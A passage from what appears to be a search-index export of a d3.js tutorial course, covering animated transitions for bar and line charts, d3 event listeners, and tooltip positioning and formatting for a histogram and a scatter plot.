x axis:</p> <pre><code>const xAxis = bounds.select(\".x-axis\")\n    .transition(updateTransition)\n    .call(xAxisGenerator)\n</code></pre> <p>Remember that we couldn't animate our x axis with CSS transition? Our transition objects are built to handle axis updates \u2014 we can see our tick marks move to fit the new domain before the new tick marks are drawn.</p> <p></p> <p>But what about animating our bars when they leave? Good question - exit animations are often difficult to implement because they involve delaying element removal. Thankfully, d3 transition makes this pretty simple.</p> <p>Let's start by creating a transition right before we create <code>updateTransition</code>. Let's also take out the easing we added to <code>updateTransition</code> since it's a little distracting.</p> <pre><code>const exitTransition = d3.transition().duration(600)\nconst updateTransition = d3.transition().duration(600)\n</code></pre> <p>We can target only the bars that are exiting using our <code>.exit()</code> method. Let's turn them red before they animate to make it clear which bars are leaving. Then we can use our <code>exitTransition</code> and animate the <code>y</code> and <code>height</code> values so the bars shrink into the x axis.</p> <p>A&gt;Don't look at the browser just yet, we'll need to finish our exit transition first.</p> <pre><code>const oldBinGroups = binGroups.exit()\noldBinGroups.selectAll(\"rect\")\n        .style(\"fill\", \"red\")\n    .transition(exitTransition)\n        .attr(\"y\", dimensions.boundedHeight)\n        .attr(\"height\", 0)\n</code></pre> <p>And we'll remember to also transition our text this time:</p> <pre><code>oldBinGroups.selectAll(\"text\")\n  .transition(exitTransition)\n      .attr(\"y\", dimensions.boundedHeight)\n</code></pre> <p>Last, we need to actually remove our bars from the DOM. We'll use a new transition here \u2014 not because we can animate removing the elements, but to delay their removal until the transition is over.</p> <pre><code>oldBinGroups\n    .transition(exitTransition)\n        .remove()\n</code></pre> <p>Now we can look at the browser, and we can see our bars animating in and out!</p> <p></p> <p>There is one issue, though: our bars are moving to their new positions while the bars are still exiting and we end up with intermediate states like this one:</p> <p></p> <p>To fix this, we'll delay the update transition until the exit transition is finished. Instead of creating a our <code>updateTransition</code> as a root transition, we can chain it on our existing <code>exitTransition</code>.</p> <pre><code>const exitTransition = d3.transition().duration(600)\nconst updateTransition = exitTransition.transition().duration(600)\n</code></pre> <p>A&gt;We're chaining transitions here to run them one after the other \u2014 d3 transitions also have a <code>.delay()</code> method if you need to delay a transition for a certain amount of time. Check out the docs for more information.</p> <p>Wonderful! Now that we've gone through the three different ways we can animate changes, let's recap when each method is appropriate.</p> <p>SVG <code>&lt;animate&gt;</code> is never really appropriate.</p> <p>CSS <code>transition</code> is useful for animating CSS properties. A good rule of thumb is to use these mainly for stylistic polish \u2014 that way we can keep simpler transitions in our stylesheets, with the main goal of making our visualizations feel smoother.</p> <p><code>d3.transition()</code> is what we want to use for more complex animations: whenever we need to chain or synchronize with another transition or with DOM changes.</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.03/d3-transition/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_03/lesson_03.04/lines/","title":"Lines","text":"<p>After animating bars, animating line transitions should be easy, right? Let's find out!</p> <p></p> <p>Does this example look familiar? This is our timeline drawing code from Module 1 with some small updates.</p> <p></p> <p>One of the main changes is an <code>addNewDay()</code> function at the bottom of the script. This exact code isn't important \u2014 what is good to know is that <code>addNewDay()</code> shifts our dataset one day in the future. To simulate a live timeline, <code>addNewDay()</code> runs every 1.5 seconds.</p> <p>A&gt;If you read through the <code>addNewDay()</code> code and were confused by the <code>...dataset.slice(1),</code> syntax, the <code>...</code> is using ES6 spread syntax to expand the dataset (minus the first point) in place. Read more about it in the MDN docs.</p> <p>We can see our timeline updating when we load our webpage, but it looks jerky. We know how to smooth the axis transitions, let's make them nice and slow.</p> <pre><code>const xAxis = bounds.select(\".x-axis\")\n    .transition().duration(1000)\n    .call(xAxisGenerator)\n</code></pre> <p>Great! Now let's transition the line.</p> <pre><code>const line = bounds.select(\".line\")\n    .transition().duration(1000)\n        .attr(\"d\", lineGenerator(dataset))\n</code></pre> <p>What's going on here? Why is our line wriggling around instead of adding a new point at the end?</p> <p></p> <p>Remember when we talked about how path d attributes are a string of draw-to values, like a learn-coding turtle? d3 is transitioning each point to the next point at the same index. Our transition's <code>.attr()</code> function has no idea that we've just shifted our points down one index. It's guessing how to transition to the new d value, animating each point to the next day's y value.</p> <p>Pretend you're the <code>.attr()</code> function - how would you transition between these two d values?</p> <pre><code>&lt;path d=\"M 0 50 L 1 60 L 2 70 L 3 80 Z\" /&gt;\n&lt;path d=\"M 0 60 L 1 70 L 2 80 L 3 90 Z\" /&gt;\n</code></pre> <p>It would make the most sense to transition each point individually, interpolating from <code>0 50</code> to <code>0 60</code> instead of moving each point to the left.</p> <p>Great, we understand why our line is wriggling, but how do we shift it to the left instead?</p> <p>Let's start by figuring out how far we need to shift our line to the left. Before we update our line, let's grab the last two points in our dataset and find the difference between their x values.</p> <pre><code>const lastTwoPoints = dataset.slice(-2)\nconst pixelsBetweenLastPoints = xScale(xAccessor(lastTwoPoints[1]))\n  - xScale(xAccessor(lastTwoPoints[0]))\n</code></pre> <p>Now when we update our line, we can instantly shift it to the right to match the old line.</p> <pre><code>const line = bounds.select(\".line\")\n        .attr(\"d\", lineGenerator(dataset))\n        .style(\"transform\", `translateX(${pixelsBetweenLastPoints}px)`)\n</code></pre> <p></p> <p>This shift should be invisible because we're shifting our x scale to the left by the same amount at the same time.</p> <p></p> <p>Then we can animate un-shifting the line to the left, to its normal position on the x axis.</p> <pre><code>const line = bounds.select(\".line\")\n        .attr(\"d\", lineGenerator(dataset))\n        .style(\"transform\", `translateX(${pixelsBetweenLastPoints}px)`)\n    .transition().duration(1000)\n        .style(\"transform\", `none`)\n</code></pre> <p></p> <p>Okay great! We can see the line updating before it animates to the left, but we don't want to see the new point until it's within our bounds. The easiest way to hide out-of-bounds data is to add a <code>&lt;clipPath&gt;</code>.</p> <p>A <code>&lt;clipPath&gt;</code> is an SVG element that:</p> <ul> <li>is sized by its children. If a <code>&lt;clipPath&gt;</code> contains a circle, it will only paint content within that circle's bounds.</li> <li>can be referenced by another SVG element, using the <code>&lt;clipPath&gt;</code>'s <code>id</code>.</li> </ul> <p>Before we test it out, we need to learn one important SVG convention: using <code>&lt;defs&gt;</code>. The SVG <code>&lt;defs&gt;</code> element is used to store any re-usable definitions that are used later in the <code>&lt;svg&gt;</code>. By placing any <code>&lt;clipPath&gt;</code>s or gradients in our <code>&lt;defs&gt;</code> element, we'll make our code more accessible. We'll also know where to look when we're debugging, similar to defining constants in one place before we use them.</p> <p>Now that we know this convention, let's create our <code>&lt;defs&gt;</code> element and add our <code>&lt;clipPath&gt;</code> inside. We'll want to put this definition right after we define our bounds. Let's also give it an <code>id</code> that we can reference later.</p> <pre><code>const bounds = wrapper.append(\"g\")\n    .style(\"transform\", `translate(${\n      dimensions.margin.left\n    }px, ${\n      dimensions.margin.top\n    }px)`)\n\nbounds.append(\"defs\")\n  .append(\"clipPath\")\n    .attr(\"id\", \"bounds-clip-path\")\n</code></pre> <p>If we inspect our <code>&lt;clipPath&gt;</code> in the Elements panel, we can see that it's not rendering at all.</p> <p></p> <p>Remember, the <code>&lt;clipPath&gt;</code> element's shape depends on its children, and it has no children yet. Let's add a <code>&lt;rect&gt;</code> that covers our bounds.</p> <pre><code>bounds.append(\"defs\")\n  .append(\"clipPath\")\n    .attr(\"id\", \"bounds-clip-path\")\n  .append(\"rect\")\n    .attr(\"width\", dimensions.boundedWidth)\n    .attr(\"height\", dimensions.boundedHeight)\n</code></pre> <p>To use our <code>&lt;clipPath&gt;</code> we'll create a group with the attribute <code>clip-path</code> pointing to our <code>&lt;clipPath&gt;</code>'s <code>id</code>. The order in which we draw SVG elements determines their \"z-index\". Keeping that in mind, let's add our new group after we draw the freezing <code>&lt;rect&gt;</code>.</p> <pre><code>bounds.append(\"rect\")\n    .attr(\"class\", \"freezing\")\nconst clip = bounds.append(\"g\")\n    .attr(\"clip-path\", \"url(#bounds-clip-path)\")\n</code></pre> <p>Now we can update our <code>path</code> to sit inside of our new group, instead of the <code>bounds</code>.</p> <pre><code>clip.append(\"path\")\n    .attr(\"class\", \"line\")\n</code></pre> <p>Voila! We can see that our line's new point isn't fully visible until it has finished un-shifting.</p> <p></p> <p>A&gt;We can see that the first point of our dataset is being removed before our line un-shifts. I bet you could think of a few ways around this \u2014 feel free to implement one or two! A&gt;We could save the old dataset and preserve that extra point until our line is unshifted, or we could slice off the first data point when we define our x scale. In a production graph, the solution would depend on how our data is updating and what's appropriate to show.</p> <p>Now that we have the tools needed to make our chart transitions lively, we'll learn how to let our users interact with our charts!</p>"},{"location":"datav/codes/code/course-full/module_03/lesson_03.04/lines/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_03/lesson_03.05/exercise-week-4/","title":"This week's exercise","text":"<p>Awesome work getting through all of those animations! During this week, add animated transitions to one of the custom charts you created in our previous exercises!</p> <p>Choose whichever chart you are most excited about animating. Here are a few suggestions:</p> <ul> <li>animate the initialization of your scatter plot, making the dots fly in from the bottom, left on page load</li> <li>animate your line chart so that it floats up from the bottom on page load</li> <li>animate your histogram so the bars \"bounce\" every 10 seconds</li> </ul> <p>Now, go over the same steps we went through this week to add transitions to one of your custom charts.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.00/interactions/","title":"Interactions","text":"<p>The biggest advantage of creating charts with JavaScript is the ability to respond to user input. In this module, we'll learn what ways users can interact with our graphs and how to implement them.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.01/d3-events/","title":"d3 events","text":"<p>Browsers have native event listeners \u2014 using <code>addEventListener()</code>, we can listen for events from a user's:</p> <ul> <li>mouse</li> <li>keyboard</li> <li>scroll wheel</li> <li>touch</li> <li>resize</li> <li>... and more.</li> </ul> <p>For example:</p> <pre><code>function onClick(event) {\n  // do something here...\n}\naddEventListener(\"click\", onClick)\n</code></pre> <p>After running this code, the browser will trigger <code>onClick()</code> when a user clicks anywhere on the page.</p> <p>These event listeners have tons of functionality and are simple to use. We can get even more functionality using d3's event listener wrappers!</p> <p>Our d3 selection objects have an <code>.on()</code> method that will create event listeners on our selected DOM elements. Let's take a look at how to implement d3 event listeners.</p> <p></p> <p>If we open the <code>events.js</code> file, we can see a few things happening:</p> <ol> <li>We define <code>rectColors</code> as an array of colors.</li> <li>We grab all <code>.rect</code> elements inside of the <code>#svg</code> element (created in <code>index.html</code>) and bind our selection to the <code>rectColors</code> array.</li> <li>We use <code>.join()</code> to isolate all new data points (every row in <code>rectColors</code>) and append a <code>&lt;rect&gt;</code> for each color.</li> <li>Lastly, we set each <code>&lt;rect&gt;</code>'s size to 100 pixels by 100 pixels and shift each item 110 pixels to the right (multiplied by its index). We also make all of our boxes light grey.</li> </ol> <p>In our browser, we can see our four boxes.</p> <p></p> <p>They don't do much right now, let's make it so they change to their designated color on hover.</p> <p>To add a d3 event listener, we pass the type of event we want to listen for as the first parameter of <code>.on()</code>. Any DOM event type will work \u2014 see the full list of event types on the MDN docs. To mimic a hover start, we'll want to target <code>mouseenter</code>.</p> <pre><code>rect.on(\"mouseenter\")\n</code></pre> <p>The second parameter <code>.on()</code> receives is a callback function that will be executed when the specified event happens. This function will receive two parameters:</p> <ol> <li>the event</li> <li>the bound datum</li> </ol> <p>Let's log these parameters to the console to get a better look.</p> <pre><code>rects.on(\"mouseenter\", (event, d) =&gt; {\n  console.log({event, d})\n})\n</code></pre> <p>T&gt;It can often be helpful to use ES6 object property shorthand for logging multiple variables. This way, we can see the name and value of each variable!</p> <p>When we hover over a box, we can see that our <code>mouseenter</code> event is triggered! The parameters passed to our function(in order) are:</p> <ol> <li>an event object</li> <li>the matching data point bound from the <code>rectColors</code> array (in this case, the color)</li> </ol> <p>In order to change the color of the current box, we'll need to create a d3 selection targeting only that box. Let's take a look at what our <code>event</code> object looks like.</p> <p>Perfect! It looks like our <code>event</code> object has a <code>currentTarget</code> key. We can use <code>event.currentTarget</code> to create a d3 selection and set the box's fill using the <code>datum</code>.</p> <pre><code>rects.on(\"mouseenter\", (event, d) =&gt; {\n   const selection = d3.select(event.currentTarget)\n   selection.attr(\"fill\", d)\n})\n</code></pre> <p>Now when we refresh our webpage, we can change our boxes to their related color on hover!</p> <p></p> <p>Hmm, we're missing something. We want our boxes to turn back to grey when our mouse leaves them. Let's chain another event listener that triggers on <code>mouseleave</code> and make our box grey again.</p> <pre><code>rects.on(\"mouseenter\", (event, d) =&gt; {\n  const selection = d3.select(event.currentTarget)\n  selection.attr(\"fill\", d)\n})\n.on(\"mouseleave\", (event) =&gt; {\n  const selection = d3.select(event.currentTarget)\n  selection.attr(\"fill\", \"lightgrey\")\n})\n</code></pre> <p>T&gt;<code>mouseenter</code> is often seen as interchangeable with <code>mouseover</code>. The two events are very similar, but <code>mouseenter</code> is usually closer to the wanted behavior. They are both triggered when the mouse enters the targeted container, but <code>mouseover</code> is also triggered when the mouse moves between nested elements. T&gt; T&gt;This same distinction applies to <code>mouseleave</code> (preferred) and <code>mouseout</code>.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.01/d3-events/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_04/lesson_04.02/destroying-d3-event-listeners/","title":"Destroying d3 event listeners","text":"<p>Before we look at adding events to our charts, let's learn how to destroy our event handlers. Removing old event listeners is important for updating charts and preventing memory leaks, among other things.</p> <p></p> <p>Let's add a 3 second timeout at the end of our code so we can test that our mouse events are working before we destroy them.</p> <pre><code>setTimeout(() =&gt; {\n}, 3000)\n</code></pre> <p>Removing a d3 event listener is easy \u2014 all we need to do is call <code>.on()</code> with <code>null</code> as the triggered function.</p> <pre><code>setTimeout(() =&gt; {\n  rects\n    .on(\"mouseenter\", null)\n    .on(\"mouseleave\", null)\n}, 3000)\n</code></pre> <p>Perfect! Now our hover events will stop working after 3 seconds.</p> <p>You might notice that a box might be stuck with its hovered color if it was hovered over when the mouse events were deleted.</p> <p></p> <p>Luckily, there's an easy fix!</p> <p>D3 selections have a <code>.dispatch()</code> method that will programatically trigger an event \u2014 no actual mouseleave needed. We can trigger a <code>mouseleave</code> event right before we remove it to ensure that our boxes finish in their \"neutral\" state.</p> <pre><code>setTimeout(() =&gt; {\n  rects\n    .dispatch(\"mouseleave\")\n    .on(\"mouseenter\", null)\n    .on(\"mouseleave\", null)\n}, 3000)\n</code></pre> <p>Perfect! Now that we have a good handle on using d3 event listeners, let's use them to make our charts interactive.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.02/destroying-d3-event-listeners/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_04/lesson_04.03/bar-chart/","title":"Bar chart","text":"<p>Let's add interactions to the histogram that we created in Module 3.</p> <p>{width=75%} </p> <p>Our goal in the section is to add an informative tooltip that shows the humidity range and day count when a user hovers over a bar.</p> <p>{width=75%} </p> <p>We could use d3 event listeners to change the bar's color on hover, but there's an alternative: CSS hover states. To add CSS properties that only apply when an element is hovered  over, add <code>:hover</code> after the selector name. It's good practice to place this selector immediately after the non-hover styles to keep all bar styles in one place.</p> <p></p> <p>Let's add a new selector to the <code>styles.css</code> file.</p> <pre><code>.bin rect:hover {\n}\n</code></pre> <p>Let's have our bars change their fill to purple when we hover over them.</p> <pre><code>.bin rect:hover {\n    fill: purple;\n}\n</code></pre> <p>Great, now our bars should turn purple when we hover over them and back to blue when we move our mouse out.</p> <p>{width=75%} </p> <p>Now we know how to implement hover states in two ways: CSS hover states and event listeners. Why would we use one over the other?</p> <p>CSS hover states are good to use for more stylistic updates that don't require DOM changes. For example, changing colors or opacity. If we're using a CSS preprocessor like SASS, we can use any color variables instead of duplicating them in our JavaScript file.</p> <p>JavaScript event listeners are what we need to turn to when we need a more complicated hover state. For example, if we want to update the text of a tooltip or move an element, we'll want to do that in JavaScript.</p> <p>Since we need to update our tooltip text and position when we hover over a bar, let's add our <code>mouseenter</code> and <code>mouseleave</code> event listeners at the bottom of our <code>bars.js</code> file. We can set ourselves up with named functions to keep our chained code clean and concise.</p> <pre><code>binGroups.select(\"rect\")\n    .on(\"mouseenter\", onMouseEnter)\n    .on(\"mouseleave\", onMouseLeave)\n\nconst onMouseEnter = (event, d) =&gt; {\n}\n\nconst onMouseLeave = (event, d) =&gt; {\n}\n</code></pre> <p>Starting with our <code>onMouseEnter()</code> function, we'll start by grabbing our tooltip element. If you look in our <code>index.html</code> file, you can see that our template starts with a tooltip with two children: a div to display the range and a div to display the value. We'll follow the common convention of using ids as hooks for JavaScript and classes as hooks for CSS. There are two main reasons for this distinction:</p> <ol> <li> <p>We can use classes in multiple places (if we wanted to style multiple elements at once) but we'll only use an id in one place. This ensures that we're selecting the correct element in our chart code</p> </li> <li> <p>We want to separate our chart manipulation code and our styling code \u2014 we should be able to move our chart hook without affecting the styles.</p> </li> </ol> <p>A&gt;We could create our tooltip in JavaScript, the same way we have been creating and manipulating SVG elements with d3. We have it defined in our HTML file here, which is generally easier to read and maintain since the tooltip layout is static.</p> <p>If we open up our styles.css, we can see our basic tooltip styles, including using a pseudo-selector <code>.tooltip:before</code> to add an arrow pointing down (at the hovered bar). Also note that the tooltip is hidden (<code>opacity: 0</code>) and will transition any property changes (<code>transition: all 0.2s ease-out</code>). It also will not receive any mouse events (<code>pointer-events: none</code>) to prevent from stealing the mouse events we'll be implementing.</p> <p>Let's comment out the <code>opacity: 0</code> property so we can get a look at our tooltip.</p> <pre><code>.tooltip {\n    /* opacity: 0; */\n</code></pre> <p>We can see that our tooltip is positioned in the top left of our page.</p> <p>{width=75%} </p> <p>If we position it instead at the top left of our chart, we'll be able to shift it based on the hovered bar's position in the chart.</p> <p>We can see that our tooltip is absolutely positioned all the way to the left and 12px above the top (to offset the bottom triangle). So why isn't it positioned at the top left of our chart?</p> <p>Absolutely positioned elements are placed relative to their containing block. The default containing block is the <code>&lt;html&gt;</code> element, but will be overridden by certain ancestor elements. The main scenario that will create a new containing block is if the element has a <code>position</code> other than the default (<code>static</code>). There are other scenarios, but they are much more rare (for example, if a <code>transform</code> is specified).</p> <p>This means that our tooltip will be positioned at the top left of the nearest ancestor element that has a set <code>position</code>. Let's give our <code>.wrapper</code> element a position of <code>relative</code>.</p> <pre><code>.wrapper {\n    position: relative;\n}\n</code></pre> <p>Perfect! Now our tooltip is located at the top left of our chart and ready to be shifted into place when a bar is hovered over.</p> <p>{width=75%} </p> <p>Let's start adding our mouse events in <code>bars.js</code> by grabbing the existing tooltip using its id (<code>#tooltip</code>). Our tooltip won't change once we load the page, so let's define it outside of our <code>onMouseEnter()</code> function.</p> <pre><code>const tooltip = d3.select(\"#tooltip\")\nfunction onMouseEnter(event, d) {\n}\n</code></pre> <p>Now let's start fleshing out our <code>onMouseEnter()</code> function by updating our tooltip text to tell us about the hovered bar. Let's select the nested <code>#count</code> element and update it to display the y value of the bar. Remember, in our histogram the y value is the number of days in our dataset that fall in that humidity level range.</p> <pre><code>const tooltip = d3.select(\"#tooltip\")\nfunction onMouseEnter(event, d) {\n    tooltip.select(\"#count\")\n        .text(yAccessor(d))\n}\n</code></pre> <p>Looking good! Now our tooltip updates when we hover over a bar to show that bar's count.</p> <p>{width=75%} </p> <p>Next, we can update our range value to match the hovered bar. The bar is covering a range of humidity values, so let's make an array of the values and join them with a <code>-</code> (which can be easier to read than a template literal).</p> <pre><code>tooltip.select(\"#range\")\n    .text([\n        d.x0,\n        d.x1\n    ].join(\" - \"))\n</code></pre> <p>Our tooltip now updates to display both the count and the range, but it might be a bit too precise.</p> <p>{width=75%} </p> <p>We could convert our range values to strings and slice them to a certain precision, but there's a better way. It's time to meet <code>d3.format()</code>.</p> <p>The d3-format module helps turn numbers into nicely formatted strings. Usually when we display a number, we'll want to parse it from its raw format. For example, we'd rather display <code>32,000</code> than <code>32000</code> \u2014 the former is easier to read and will help with scanning a list of numbers.</p> <p>If we pass <code>d3.format()</code> a format specifier string, it will create a formatter function. That formatter function will take one parameter (a number) and return a formatted string. There are many possible format specifier strings \u2014 let's go over the format for the options we'll use the most often.</p> <p><code>[,][.precision][type]</code></p> <p>Each of these specifiers is optional \u2014 if we use an empty string, our formatter will just return our number as a string. Let's talk about what each specifier tells our formatter.</p> <p><code>,</code>: add commas every 3 digits to the left of the decimal place</p> <p><code>.precision</code>: give me this many numbers after the decimal place.</p> <p><code>type</code>: each specific type is declared by using a single letter or symbol. The most handy types are:</p> <ul> <li>f: fixed point notation \u2014 give me <code>precision</code> many decimal points</li> <li>r: decimal notation \u2014 give me <code>precision</code> many significant digits and pad the rest until the decimal point</li> <li>%: percentage \u2014 multiply my number by 100 and return <code>precision</code> many decimal points</li> </ul> <p>Run through a few examples in your terminal to get the hang of it.</p> <pre><code>d3.format( \".2f\")(11111.111) // \"11111.11\"\nd3.format(\",.2f\")(11111.111) // \"11,111.11\"\nd3.format(\",.0f\")(11111.111) // \"11,111\"\nd3.format(\",.4r\")(11111.111) // \"11,110\"\nd3.format( \".2%\")(0.111)     // \"11.10%\"\n</code></pre> <p>Let's create a formatter for our humidity levels. Two decimal points should be enough to differentiate between ranges without overwhelming our user with too many <code>0</code>s.</p> <pre><code>const formatHumidity = d3.format(\".2f\")\n</code></pre> <p>Now we can use our formatter to clean up our humidity level numbers.</p> <pre><code>const formatHumidity = d3.format(\".2f\")\ntooltip.select(\"#range\")\n    .text([\n        formatHumidity(d.x0),\n        formatHumidity(d.x1)\n    ].join(\" - \"))\n</code></pre> <p>Nice! An added benefit to our number formatting is that our range numbers are the same width for every value, preventing our tooltip from jumping around.</p> <p>{width=75%} </p> <p>Next, we want to position our tooltip horizontally centered above a bar when we hover over it. To calculate our tooltip's <code>x</code> position, we'll need to take three things into account:</p> <ul> <li>the bar's <code>x</code> position in the chart (<code>xScale(d.x0)</code>),</li> <li>half of the bar's width ((xScale(d.x1) - xScale(d.x0)) / 2`), and</li> <li>the margin by which our bounds are shifted right (<code>dimensions.margin.left</code>).</li> </ul> <p>Remember that our tooltip is located at the top left of our wrapper - the outer container of our chart. But since our bars are within our bounds, they are shifted by the margins we specified.</p> <p>{width=75%} </p> <p>Let's add these numbers together to get the <code>x</code> position of our tooltip.</p> <pre><code>const x = xScale(d.x0)\n  + (xScale(d.x1) - xScale(d.x0)) / 2\n  + dimensions.margin.left\n</code></pre> <p>When we calculate our tooltip's y position, we don't need to take into account the bar's dimensions because we want it placed above the bar. That means we'll only need to add two numbers:</p> <ol> <li>the bar's <code>y</code> position (<code>yScale(yAccessor(d))</code>), and</li> <li>the margin by which our bounds are shifted down (<code>dimensions.margin.top</code>)</li> </ol> <pre><code>const y = yScale(yAccessor(d))\n  + dimensions.margin.top\n</code></pre> <p>Let's use our <code>x</code> and <code>y</code> positions to shift our tooltip. Because we're working with a normal xHTML div, we'll use the CSS translate property.</p> <pre><code>tooltip.style(\"transform\", `translate(`\n  + `${x}px,`\n  + `${y}px`\n  + `)`)\n</code></pre> <p>A&gt;Why are we setting the transform CSS property and not left and top? A good rule of thumb is to avoid changing (and especially animating) CSS values other than transform and opacity. When the browser styles elements on the page, it runs through several steps: A&gt; A&gt;1. calculate style A&gt;2. layout A&gt;3. paint, and A&gt;4. layers A&gt; A&gt;Most CSS properties affect steps 2 or 3, which means that the browser has to perform that step and the subsequent steps every time that property is changed. Transform and opacity only affect step 4, which cuts down on the amount of work the browser has to do. Read more about each step and this distinction at https://www.html5rocks.com/en/tutorials/speed/high-performance-animations/.</p> <p>Hmm, why is our tooltip in the wrong position? It looks like we're positioning the top left of the tooltip in the right location (above the hovered bar).</p> <p>{width=75%} </p> <p>We want to position the bottom, center of our tooltip (the tip of the arrow) above the bar, instead. We could find the tooltip size by calling the <code>.getBoundingClientRect()</code> method, but there's a computationally cheaper way.</p> <p>There are a few ways to shift absolutely positioned elements using CSS properties:</p> <ul> <li><code>top</code>, <code>left</code>, <code>right</code>, and <code>bottom</code></li> <li><code>margin</code>s</li> <li><code>transform: translate()</code></li> </ul> <p>All of these properties can receive percentage values, but some of them are based on different dimensions.</p> <ul> <li><code>top</code> and <code>bottom</code>: percentage of the parent's height</li> <li><code>left</code> and <code>right</code>: percentage of the parent's width</li> <li><code>margin</code>s:  percentage of the parent's width</li> <li><code>transform: translate()</code>: percentage of the specified element</li> </ul> <p>We're interested in shifting the tooltip based on its own height and width, so we'll need to use <code>transform: translate()</code>. But we're already applying a <code>translate</code> value \u2014 how can we set the <code>translate</code> value using a pixel amount and a width?</p> <p>CSS <code>calc()</code> comes to the rescue here! We can tell CSS to calculate an offset based on values with different units. For example, the following CSS rule would cause an element to be 20 pixels wider than its container.</p> <pre><code>width: calc(100% + 20px);\n</code></pre> <p>Let's use <code>calc()</code> to offset our tooltip up half of its own width (<code>-50%</code>) and left <code>-100%</code> of its own height. This is in addition to our calculated <code>x</code> and <code>y</code> values.</p> <pre><code>tooltip.style(\"transform\", `translate(`\n  + `calc( -50% + ${x}px),`\n  + `calc(-100% + ${y}px)`\n  + `)`)\n</code></pre> <p>Perfect! Now our tooltip moves to the exact location we want.</p> <p>{width=75%} </p> <p>We have one last task to do \u2014 hide the tooltip when we're not hovering over a bar. Let's un-comment the <code>opacity: 0</code> rule in <code>styles.css</code> so its hidden to start.</p> <pre><code>.tooltip {\n    opacity: 0;\n</code></pre> <p>Jumping back to our bars.js file, we need to make our tooltip visible at the end of our <code>onMouseEnter()</code> function.</p> <pre><code>tooltip.style(\"opacity\", 1)\n</code></pre> <p>Lastly, we want to make our tooltip invisible again whenever our mouse leaves a bar. Let's add that to our <code>onMouseLeave()</code> function.</p> <pre><code>function onMouseLeave() {\n  tooltip.style(\"opacity\", 0)\n}\n</code></pre> <p>Look at that! You just made an interactive chart that gives users more information when they need it. Positioning tooltips is not a simple feat, so give yourself a pat on the back! Next up, we'll learn an even fancier method for making it easy for users to get tooltips even for small, close-together elements.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.03/bar-chart/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_04/lesson_04.04/scatter-plot/","title":"Scatter plot","text":"<p>Let's level up and add tooltips to a scatter plot.</p> <p>{width=50%} </p> <p>We want a tooltip to give us more information when we hover over a point in our chart.</p> <p></p> <p>At the bottom of the file, we'll select all of our  elements and add a <code>mousenter</code> and a <code>mouseleave</code> event.</p> <pre><code>bounds.selectAll(\"circle\")\n    .on(\"mouseenter\", onMouseEnter)\n    .on(\"mouseleave\", onMouseLeave)\n</code></pre> <p>We know that we'll need to modify our <code>#tooltip</code> element, so let's assign that to a variable. Let's also define our <code>onMouseEnter()</code> and <code>onMouseLeave()</code> functions.</p> <pre><code>const tooltip = d3.select(\"#tooltip\")\nfunction onMouseEnter(event, d) {\n}\n\nfunction onMouseLeave() {\n}\n</code></pre> <p>Let's first fill out our <code>onMouseEnter()</code> function. We want to display two values:</p> <ul> <li>the metric on our x axis (dew point), and</li> <li>the metric on our y axis (humidity).</li> </ul> <p>For both metrics, we'll want to define a string formatter using <code>d3.format()</code>. Then we'll use that formatter to set the text value of the relevant ** in our tooltip. <pre><code>function onMouseEnter(event, d) {\n  const formatHumidity = d3.format(\".2f\")\n  tooltip.select(\"#humidity\")\n      .text(formatHumidity(yAccessor(d)))\n\n  const formatDewPoint = d3.format(\".2f\")\n  tooltip.select(\"#dew-point\")\n      .text(formatDewPoint(xAccessor(d)))\n\n}\n</code></pre> <p>Let's add an extra bit of information at the bottom of this function \u2014 users will probably want to know the date of the hovered point. Our data point's date is formatted as a string, but not in a very human-readable format (for example, \"2019-01-01\"). Let's use <code>d3.timeParse</code> to turn that string into a date that we can re-format.</p> <pre><code>const dateParser = d3.timeParse(\"%Y-%m-%d\")\nconsole.log(dateParser(d.date))\n</code></pre> <p>Now we need to turn our date object into a friendlier string. The d3-time-format module can help us out here! <code>d3.timeFormat()</code> will take a date formatter string and return a formatter function.</p> <p>The date formatter string uses the same syntax as <code>d3.timeParse</code> \u2014 it follows four rules:</p> <ol> <li>it will return the string verbatim, other than specific directives,</li> <li>these directives contain a percent sign and a letter,</li> <li>usually the letter in a directive has two formats: lowerbase (abbreviated) and uppercase (full), and</li> <li>a dash (<code>-</code>) between the percent sign and the letter prevents padding of numbers.</li> </ol> <p>For example, <code>d3.timeFormat(\"%Y\")(new Date())</code> will return the current year.</p> <p>Let's learn a few handy directives:</p> <ul> <li><code>%Y</code>: the full year</li> <li><code>%y</code>: the last two digits of the year</li> <li><code>%m</code>: the padded month (eg. \"01\")</li> <li><code>%-m</code>: the non-padded month (eg. \"1\")</li> <li><code>%B</code>: the full month name</li> <li><code>%b</code>: the abbreviated month name</li> <li><code>%A</code>: the full weekday name</li> <li><code>%a</code>: the abbreviated weekday name</li> <li><code>%d</code>: the day of the month</li> </ul> <p>See the full list of directives at https://github.com/d3/d3-time-format.</p> <p>Now, let's create a formatter string that prints out a friendly date.</p> <pre><code>const dateParser = d3.timeParse(\"%Y-%m-%d\")\nconst formatDate = d3.timeFormat(\"%B %A %-d, %Y\")\nconsole.log(formatDate(dateParser(d.date)))\n</code></pre> <p>Much better! Let's plug that in to our tooltip.</p> <pre><code>const dateParser = d3.timeParse(\"%Y-%m-%d\")\nconst formatDate = d3.timeFormat(\"%B %A %-d, %Y\")\ntooltip.select(\"#date\")\n    .text(formatDate(dateParser(d.date)))\n</code></pre> <p>Next, we'll grab the <code>x</code> and <code>y</code> value of our dot , offset by the top and left margins.</p> <pre><code>const x = xScale(xAccessor(d))\n  + dimensions.margin.left\nconst y = yScale(yAccessor(d))\n  + dimensions.margin.top\n</code></pre> <p>Just like with our bars, we'll use <code>calc()</code> to add these values to the percentage offsets needed to shift the tooltip. Remember, this is necessary so that we're positioning its arrow, not the top left corner.</p> 